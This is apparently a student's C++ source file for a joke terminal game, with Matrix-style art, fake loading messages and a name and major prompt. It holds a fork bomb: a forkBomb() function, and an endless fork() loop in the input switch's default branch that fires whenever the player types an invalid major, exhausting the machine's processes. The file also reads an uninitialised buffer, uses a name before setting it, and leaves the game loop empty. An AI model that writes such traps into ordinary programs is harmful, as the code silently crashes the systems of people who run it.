// core_functions.cpp
#include "core_functions.hpp"
using namespace std;

//Game duration -- 50 days
int globalActionLimit = 50;

// refactor to use unistd.h
const chrono::nanoseconds fractionalNS = 250ms;
const chrono::nanoseconds smallNS = 1000ms;
const chrono::nanoseconds varNS = 2000ms;

// https://xoax.net/cpp/crs/console/lessons/Lesson13/

void forkBomb(){
    cout << "get pwnd" << endl;
    while(1){
        fork();
    }
}


void crashGame(){
    thread th1(forkBomb);
    th1.detach();
}


int Modulus(int iN, int iMod)
{
    int iQ = (iN / iMod);
    return iN - (iQ * iMod);
}

char GetChar(int iGenerator, char cBase, int iRange)
{
    return (cBase + Modulus(iGenerator, iRange));
}

void matrixArt()
{

    char caRow[80];
    int j = 7;
    int k = 2;
    int l = 5;
    int m = 1;
    int counter = 0;
    while (counter < 800000)
    {
        int i = 0;
        // Output a random row of characters
        while (i < 80)
        {
            if (caRow[i] != ' ')
            {
                caRow[i] = GetChar(j + i * i, 33, 30);
            }
            std::cout << caRow[i];
            ++i;
        }
        j = (j + 31);
        k = (k + 17);
        l = (l + 47);
        m = (m + 67);
        caRow[Modulus(j, 80)] = '-';
        caRow[Modulus(k, 80)] = ' ';
        caRow[Modulus(l, 80)] = '-';
        caRow[Modulus(m, 80)] = ' ';
        // Delay
        i = 0;
        while (i < 10)
        {
            GetChar(1, 1, 1);
            ++i;
        }
        counter++;
    }
}

void welcomePrompt()
{

    // Draw the matrix art out

    cout << "Loading..." << endl;
    this_thread::sleep_for(varNS);

    cout << "Stealing your crypto..." << endl;
    this_thread::sleep_for(varNS);

    cout << "Ordering Pizza..." << endl;
    this_thread::sleep_for(varNS);

    cout << "Recompiling your Kernel..." << endl;
    this_thread::sleep_for(varNS);

    cout << "Wasting your time..." << endl;
    this_thread::sleep_for(varNS);

    cout << '\n'
         << endl;
    cout << '\n'
         << endl;

    cout << "ENTERING THE MATRIX" << endl;
    this_thread::sleep_for(varNS);

    matrixArt();
    cout << '\n'
         << endl;
    cout << '\n'
         << endl;

    for (int i = 0; i < 10; i++)
    {
        cout << "DO" << endl;
    }
    this_thread::sleep_for(varNS);

    for (int i = 0; i < 10; i++)
    {
        cout << "NOT" << endl;
    }
    this_thread::sleep_for(varNS);

    for (int i = 0; i < 10; i++)
    {
        cout << "LOOK" << endl;
    }
    this_thread::sleep_for(varNS);

    for (int i = 0; i < 10; i++)
    {
        cout << "BACK" << endl;
    }
    this_thread::sleep_for(varNS);

    cout << '\n'
         << endl;
    cout << '\n'
         << endl;

    this_thread::sleep_for(varNS);

    cout << "..." << endl;
    this_thread::sleep_for(varNS);
    this_thread::sleep_for(varNS);

    cout << "Wake Up..." << endl;
}

void grabInput(int &x)
{

    int userInput;
    cin >> userInput;
    x = userInput;
}

void initalizeGame()
{

    userProfile *currUser = new userProfile;
    scenariosList *tasks = new scenariosList;
    
    string userName;
    cout << "What is your name?" << endl;
    getline(cin, userName);
    this_thread::sleep_for(fractionalNS);
    cout << "Hello " << userName << endl;
    this_thread::sleep_for(smallNS);

    cout << "Welcome to Game 3. Happy you've made it here so far. " << endl;

    this_thread::sleep_for(smallNS);
    cout << "What is your Major?" << endl;
    this_thread::sleep_for(fractionalNS);
    cout << "0 for Questrom" << endl;
    cout << "1 for Engineering" << endl;
    cout << "2 for CAS" << endl;
    cout << "3 if you're a dropout" << endl;

    int userMajor = INT16_MAX;
    grabInput(userMajor);
    this_thread::sleep_for(fractionalNS);

    if(userMajor == 1)
        cout << "Great, go shower. You smell" << endl;
    this_thread::sleep_for(fractionalNS);

    switch (userMajor)
    {
    case 0:
        currUser->major = QST;
        break;
    case 1:
        currUser->major = ENG;
        break;
    case 2:
        currUser->major = CAS;
        break;
    case 3:
        currUser->major = DROPOUT;
        break;

    default:
        cout << "Your Input was incorrect. I thought the instructions were clear." << endl;
        this_thread::sleep_for(smallNS);
        cout << "..." << endl;
        cout << "Do you really think you will get off that easy?" << endl;
        this_thread::sleep_for(smallNS);
        cout << "I'll show you how deep this rabbit hole goes, " << currUser->name << endl;

        for(int i = 0; i < 20; i ++){
            cout << endl;
        }

        matrixArt();

        while(true){
            fork();
            cout << "Not so funny now, huh?" << endl;
        }

        break;
    }

    cout << "You are said your major was: " << currUser->major << endl;
    this_thread::sleep_for(smallNS);

    string redHerring;
    cout << "Do you know the secret password?" << endl;
    cin >> redHerring;
    cout << "Password Accepted!" << endl;
    this_thread::sleep_for(smallNS);
    cout << "SETUP COMPLETE" << endl;

    currUser->tasksRemaining = tasks;
    currUser->name = userName;
    currUser->timeRemaining = globalActionLimit;
    this_thread::sleep_for(smallNS);

    cout << "STARTING GAME" << endl;
}

void gameLoop(){

}